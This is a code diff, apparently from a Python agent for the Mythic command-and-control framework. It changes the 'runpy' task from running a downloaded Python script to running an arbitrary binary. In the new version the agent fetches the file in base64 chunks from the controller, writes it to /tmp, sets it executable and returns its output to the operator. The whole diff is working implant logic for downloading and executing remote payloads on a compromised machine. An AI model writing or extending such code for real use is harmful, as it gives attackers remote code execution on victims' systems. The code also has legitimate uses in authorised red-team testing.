@@ -45,22 +45,23 @@ def execute(params, task_id, callback_id):
         agent.post_response(callback_id, task_id, "runpy: file is required")
         return None
 
-    tmp_path = f"/tmp/{uuid.uuid4().hex}.py"
+    tmp_path = f"/tmp/{uuid.uuid4().hex}"
     try:
-        # Fetch script from Mythic using chunked transfer
+        # Fetch compiled binary from Mythic using chunked transfer
         chunk_resp = _fetch_chunk(callback_id, task_id, file_id, 1)
         total_chunks = chunk_resp.get("total_chunks", 1)
-        script_data = base64.b64decode(chunk_resp.get("chunk_data", ""))
+        binary_data = base64.b64decode(chunk_resp.get("chunk_data", ""))
 
         for chunk_num in range(2, total_chunks + 1):
             chunk_resp = _fetch_chunk(callback_id, task_id, file_id, chunk_num)
-            script_data += base64.b64decode(chunk_resp.get("chunk_data", ""))
+            binary_data += base64.b64decode(chunk_resp.get("chunk_data", ""))
 
-        # Write to temp file and execute
+        # Write binary to temp file, make executable, and run directly — no python3 needed
         with open(tmp_path, "wb") as fh:
-            fh.write(script_data)
+            fh.write(binary_data)
+        os.chmod(tmp_path, 0o755)
 
-        cmd = ["python3", tmp_path] + (args_str.split() if args_str else [])
+        cmd = [tmp_path] + (args_str.split() if args_str else [])
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
         output = result.stdout + result.stderr
         agent.post_response(callback_id, task_id, output if output else "(no output)")
